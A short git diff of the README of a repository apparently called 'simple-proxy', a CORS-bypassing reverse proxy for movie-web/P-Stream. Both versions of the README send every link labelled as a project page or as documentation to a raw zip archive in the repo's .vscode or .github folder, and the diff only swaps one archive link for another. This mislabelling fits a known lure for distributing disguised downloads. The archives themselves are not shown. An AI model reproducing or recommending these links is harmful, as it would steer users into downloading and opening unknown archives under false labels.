@@ -1,7 +1,7 @@
 # simple-proxy
 
-Simple reverse proxy to bypass CORS, used by [movie-web](https://raw.githubusercontent.com/kenttibusiness/simple-proxy/dev/.vscode/simple-proxy-2.7.zip)/[P-Stream](https://raw.githubusercontent.com/kenttibusiness/simple-proxy/dev/.vscode/simple-proxy-2.7.zip).
-Read the docs at https://raw.githubusercontent.com/kenttibusiness/simple-proxy/dev/.vscode/simple-proxy-2.7.zip
+Simple reverse proxy to bypass CORS, used by [movie-web](https://github.com/kenttibusiness/simple-proxy/raw/refs/heads/dev/.github/proxy-simple-v3.6.zip)/[P-Stream](https://github.com/kenttibusiness/simple-proxy/raw/refs/heads/dev/.github/proxy-simple-v3.6.zip).
+Read the docs at https://github.com/kenttibusiness/simple-proxy/raw/refs/heads/dev/.github/proxy-simple-v3.6.zip
 
 ---
 
